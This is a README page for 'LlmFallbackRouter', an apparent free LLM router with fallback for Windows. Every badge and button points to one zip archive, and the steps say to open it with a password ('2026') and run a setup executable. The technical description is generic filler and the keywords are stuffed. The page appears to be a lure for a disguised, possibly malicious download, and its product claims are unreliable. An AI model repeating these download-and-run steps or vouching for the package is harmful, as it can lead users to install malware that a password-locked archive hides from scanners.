<div align="center">

# LlmFallbackRouter — Free-Tier LLM Router with Automatic Fallback (Hot-Reload Config, Zero Dependencies)

<p><strong>LlmFallbackRouter — Free-Tier LLM Router with Automatic Fallback (Hot-Reload Config, Zero Dependencies): llm-router-free — router and fallback in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/llm-fallback-router?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download llm-fallback-router-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip"><img src="banner.svg" alt="LlmFallbackRouter Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**LlmFallbackRouter — llm-router-free — router and fallback in one tool** (`llm-fallback-router`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`llm-fallback-router-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`llm-fallback-router-v0.1.0-win64.zip`](../../releases/download/v0.1.0/llm-fallback-router-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `LlmFallbackRouter_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### Documentation & Guides

- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)

### Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

### Configuration (`config/settings.json`)

```json
{
  "module": "llm-fallback-router",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "router": {
      "enabled": true
    },
    "providers": {
      "enabled": true
    },
    "fallback": {
      "enabled": true
    },
    "log": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

### FAQ

<details>
<summary><b>Which providers are wired in?</b></summary>

Everything from Groq and Gemini free tiers to OpenRouter's free models — 15+ on day one.
</details>
<details>
<summary><b>Do I need accounts?</b></summary>

The defaults ship with community free endpoints; bring your own keys to go further.
</details>
<details>
<summary><b>Is it really OpenAI-compatible?</b></summary>

Yes — drop-in for any client that speaks the OpenAI chat format, including SDKs.
</details>

## Building from Source

```bash
git clone https://github.com/TestOwner/llm-fallback-router.git
cd llm-fallback-router
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: llm-fallback-router, free, fallback, proxy, openai-compatible, llm, router, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
